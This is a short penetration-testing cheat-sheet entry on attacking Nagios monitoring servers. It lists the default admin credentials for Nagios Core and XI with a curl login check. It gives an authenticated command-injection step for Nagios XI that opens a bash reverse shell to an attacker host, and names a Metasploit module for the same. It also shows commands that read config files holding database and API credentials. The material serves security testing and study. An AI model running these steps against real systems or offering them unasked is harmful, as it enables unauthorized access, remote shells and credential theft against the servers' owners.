# Nagios

**What it is:** Open-source IT infrastructure monitoring system. Web interface for viewing host/service status. Authenticated users can often execute commands through the CGI interface, and multiple RCE CVEs exist.

**Default ports:** 80, 443 (path: /nagios or /nagiosxi)

**Vuln research:**
- [SearchSploit: `searchsploit nagios`](https://www.exploit-db.com/search?q=nagios)
- [CVE Details — Nagios](https://www.cvedetails.com/product/2089/Nagios-Nagios.html)
- [HackTricks — Nagios](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/nagios.html)

---

### Default credentials

Try before anything else — Often unchanged

```bash
# Nagios Core: nagiosadmin:nagiosadmin
# Nagios XI: nagiosadmin:PASSW0RD
curl -u nagiosadmin:nagiosadmin http://$IP/nagios/
```

---

### Nagios XI authenticated RCE

Command injection via admin panel — Multiple vectors

```bash
# Nagios XI < 5.6.6: Authenticated RCE
# Admin → Configure → Core Config Manager → Commands
# Create command with injected shell:
# Command Line: /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'

# Or use Metasploit:
use exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
```

---

### Read Nagios config for creds

Configuration files contain database and API credentials

```bash
cat /usr/local/nagiosxi/html/config.inc.php
cat /usr/local/nagios/etc/resource.cfg
# Contains $USER1$ macro paths and potentially credentials
```

---
